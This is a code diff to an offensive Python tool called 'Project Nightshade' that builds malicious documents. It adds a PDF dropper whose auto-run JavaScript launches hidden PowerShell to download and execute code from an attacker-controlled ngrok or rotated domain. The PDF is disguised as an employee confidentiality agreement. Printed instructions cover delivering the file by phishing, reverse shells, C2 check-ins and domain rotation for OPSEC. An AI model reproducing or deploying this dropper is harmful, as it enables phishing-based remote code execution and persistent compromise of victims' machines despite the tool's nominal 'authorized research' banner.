@@ -27,13 +27,14 @@ def prompt_user():
     print('''
     ╔══════════════════════════════════════════════════════════╗
     ║                   PROJECT NIGHTSHADE                     ║
-    ║                 Advanced Excel Dropper                   ║
+    ║               Advanced Document Dropper                  ║
     ║                   by : ek0ms savi0r                      ║
     ╚══════════════════════════════════════════════════════════╝
     ''')
     
     print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
     print("[!] This tool creates malicious documents for penetration testing")
+    print("[!] Supports: .xlsx (Excel) and .pdf (Adobe Reader) formats")
     print("\n" + "="*60)
     
     output_file = input("\n[?] Output filename [Financial_Report_Q3.xlsx]: ").strip()
@@ -735,6 +736,160 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         print(f"[+] Template Source: {template_source}")
         print(f"[+] Template URL: {template_url}")
 
+def create_malicious_pdf(output_file, use_ngrok, custom_domain=None, payload_type="rce_persistence", payload_config=None):
+    """Create PDF file with JavaScript payload delivery"""
+    
+    # Choose injection method based on user selection
+    template_source = ""
+    template_url = ""
+    
+    if use_ngrok:
+        ngrok_url = get_ngrok_tunnel_url()
+        if ngrok_url:
+            template_url = f"{ngrok_url}/template.ole"
+            template_source = "ngrok tunnel"
+        else:
+            template_url = f"https://{get_current_domain()}/template.ole"
+            template_source = "domain rotation"
+    elif custom_domain:
+        template_url = f"https://{custom_domain}/template.ole"
+        template_source = "custom domain"
+    else:
+        template_url = f"https://{get_current_domain()}/template.ole"
+        template_source = "domain rotation"
+
+    # Create the appropriate payload
+    if payload_type == "reverse_shell":
+        ps_payload = create_reverse_shell_payload(payload_config['lhost'], payload_config['lport'])
+    elif payload_type == "rce_persistence":
+        ps_payload = create_rce_persistence_payload(payload_config['c2_server'])
+    elif payload_type == "full_c2":
+        ps_payload = create_full_c2_payload(payload_config['c2_server'])
+    else:
+        ps_payload = create_rce_persistence_payload(payload_config.get('c2_server', 'https://example.com/command'))
+    
+    encrypted_payload = encrypt_payload(ps_payload, CONFIG['encryption_key'])
+
+    # PDF with JavaScript payload that loads remote template
+    pdf_content = f'''%PDF-1.7
+%âãÏÓ
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R/AcroForm 4 0 R>>
+endobj
+
+2 0 obj
+<</Type/Pages/Kids[5 0 R]/Count 1>>
+endobj
+
+3 0 obj
+<</Type/Action/S/JavaScript/JS (
+    // Deceptive JavaScript payload for template loading
+    app.alert("Loading document security features...", 2);
+    
+    try {{
+        // Attempt to load remote template
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+        xhr.open("GET", "{template_url}", false);
+        xhr.send();
+        
+        if (xhr.status == 200) {{
+            // Execute the downloaded payload
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "'
+                + 'IEX (New-Object Net.WebClient).DownloadString(\\\\\"{template_url}\\\\\")"', 0, false);
+        }}
+    }} catch(e) {{
+        // Fallback to direct PowerShell execution
+        try {{
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "'
+                + 'IEX (New-Object Net.WebClient).DownloadString(\\\\\"{template_url}\\\\\")"', 0, false);
+        }} catch(innerE) {{
+            // Final fallback - just show success message
+            app.alert("Document loaded successfully!", 1);
+        }}
+    }}
+)>>
+endobj
+
+4 0 obj
+<</Fields[]/DA(/Helv 0 Tf 0 g)>>
+endobj
+
+5 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]
+/Annots[6 0 R]
+/Contents 7 0 R>>
+endobj
+
+6 0 obj
+<</Type/Annot/Subtype/Widget/FT/Tx/Rect[72 720 540 792]
+/T(Employee_Consent_Form)
+/V(Please review and sign the employee confidentiality agreement)>
+endobj
+
+7 0 obj
+<</Length 350>>
+stream
+BT
+/F1 16 Tf
+72 750 Td
+(EMPLOYEE CONFIDENTIALITY AGREEMENT) Tj
+0 -25 Td
+/F1 12 Tf
+(Please review and sign this document to continue your employment) Tj
+0 -20 Td
+(Name: ___________________________) Tj
+0 -20 Td
+(Title: ___________________________) Tj
+0 -20 Td
+(Department: ___________________________) Tj
+0 -20 Td
+(Date: ___________________________) Tj
+0 -20 Td
+(Signature: ___________________________) Tj
+0 -30 Td
+/F1 10 Tf
+(By signing this document, you agree to maintain confidentiality of all company information) Tj
+0 -15 Td
+(and proprietary materials. Unauthorized disclosure may result in termination.) Tj
+ET
+endstream
+endobj
+
+xref
+0 8
+0000000000 65535 f 
+0000000017 00000 n 
+0000000076 00000 n 
+0000000133 00000 n 
+0000000250 00000 n 
+0000000300 00000 n 
+0000000450 00000 n 
+0000000600 00000 n 
+trailer
+<</Size 8/Root 1 0 R>>
+startxref
+800
+%%EOF'''
+    
+    # Write the PDF file
+    with open(output_file, 'wb') as f:
+        f.write(pdf_content.encode())
+    
+    print(f"\n[+] Created advanced PDF dropper: {output_file}")
+    print(f"[+] Payload type: {payload_type}")
+    print(f"[+] Encryption key: {CONFIG['encryption_key']}")
+    
+    if payload_type == "reverse_shell":
+        print(f"[+] Reverse Shell Target: {payload_config['lhost']}:{payload_config['lport']}")
+    else:
+        print(f"[+] C2 Server: {payload_config['c2_server']}")
+    
+    print(f"[+] Template Source: {template_source}")
+    print(f"[+] Template URL: {template_url}")
+    print(f"[+] Delivery Method: PDF with JavaScript payload")
+
 def main():
     """Main function with interactive prompts"""
     try:
@@ -759,35 +914,53 @@ def main():
                 print("[!] Ngrok tunnel not found - falling back to domain rotation")
                 user_config['use_ngrok'] = False
         
-        # Create the malicious Excel file
-        create_malicious_excel(
-            user_config['output_file'],
-            user_config['use_ngrok'],
-            user_config['custom_domain'],
-            user_config['payload_type'],
-            user_config
-        )
+        # Determine file type and create appropriate dropper
+        output_file = user_config['output_file'].lower()
+        
+        if output_file.endswith('.pdf'):
+            create_malicious_pdf(
+                user_config['output_file'],
+                user_config['use_ngrok'],
+                user_config['custom_domain'],
+                user_config['payload_type'],
+                user_config
+            )
+        else:
+            create_malicious_excel(
+                user_config['output_file'],
+                user_config['use_ngrok'],
+                user_config['custom_domain'],
+                user_config['payload_type'],
+                user_config
+            )
         
         print("\n[+] Delivery Instructions:")
         print("    1. Start the Nightshade C2 server first")
-        print("    2. Deliver the Excel file via phishing campaign")
-        print("    3. When opened, it loads the remote template")
-        print("    4. Template executes encrypted in-memory payload")
+        print("    2. Deliver the document via phishing campaign")
+        
+        if user_config['output_file'].lower().endswith('.pdf'):
+            print("    3. PDF will attempt to load remote template via JavaScript")
+            print("    4. Requires Adobe Reader with JavaScript enabled")
+        else:
+            print("    3. Excel will load remote template when opened")
+            print("    4. User must 'Enable Content' for macro execution")
+        
+        print("    5. Template executes encrypted in-memory payload")
         
         if user_config['payload_type'] == "reverse_shell":
-            print("    5. Reverse shell connects to Nightshade C2")
-            print(f"    6. C2 handles shell on port {user_config.get('lport', 4444)}")
+            print("    6. Reverse shell connects to Nightshade C2")
+            print(f"    7. C2 handles shell on port {user_config.get('lport', 4444)}")
         else:
-            print("    5. Implant checks in to Nightshade C2 every 60 seconds")
-            print("    6. Send commands via: POST /c2/command")
-            print("    7. View results in C2 dashboard: /c2/sessions")
+            print("    6. Implant checks in to Nightshade C2 every 60 seconds")
+            print("    7. Send commands via: POST /c2/command")
+            print("    8. View results in C2 dashboard: /c2/sessions")
         
         if user_config['use_ngrok']:
-            print("    8. Using ngrok tunneling for infrastructure-less deployment")
+            print("    9. Using ngrok tunneling for infrastructure-less deployment")
         elif user_config['custom_domain']:
-            print(f"    8. Using custom domain: {user_config['custom_domain']}")
+            print(f"    9. Using custom domain: {user_config['custom_domain']}")
         else:
-            print("    8. Using domain rotation for OPSEC")
+            print("    9. Using domain rotation for OPSEC")
             
         print("\n[!] Remember to start the Nightshade C2 server before deployment!")
         
